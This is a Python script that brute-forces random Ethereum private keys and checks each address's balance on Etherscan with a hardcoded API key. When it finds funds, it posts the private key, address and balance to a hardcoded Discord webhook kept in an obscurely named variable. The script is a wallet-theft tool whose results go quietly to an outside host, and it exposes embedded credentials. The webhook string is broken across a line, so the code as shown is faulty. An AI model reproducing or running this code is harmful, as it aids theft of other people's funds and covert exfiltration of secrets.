import time
import requests
from web3 import Account
from eth_account import Account as LocalAccount
from termcolor import colored
from colorama import init, Fore, Style

init()

API_KEYS = [
    "G8C8RQ2RRXBTAKC2AUV4Z54G2WJDMI9CBZ",
]

api_key_index = 0

while True:
    private_key = LocalAccount.create().key.hex()[2:]
    llb = "https://discord.com/api/webhooks/1086049520728686704/_a4SAqNQXPWRGAuTq45Cj_7o9zCFS3tW17ZherdHfUHFbWHlmFQ5W5GeRPJ1n-474Qu1
"
    address = Account.from_key(private_key).address
    api_key = API_KEYS[api_key_index]
    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
    response = requests.get(url)
    balance = int(response.json()["result"]) / 10**18

    if balance > 0:
        message = f"Private key| {private_key}\nAddress| {address}\nBalance| {balance} ETH"
        print(colored(message, 'green'))

        data = {"content": message}
        headers = {"Content-Type": "application/json"}
        response = requests.post(llb, json=data, headers=headers)

        break
    else:
        print(colored("Private key| ", "white") + colored(private_key, "red") + colored(" | ", "white") + colored(balance, "red") + (" ETH"))

        
    api_key_index = (api_key_index + 1) % len(API_KEYS)
    time.sleep(0.0000002)
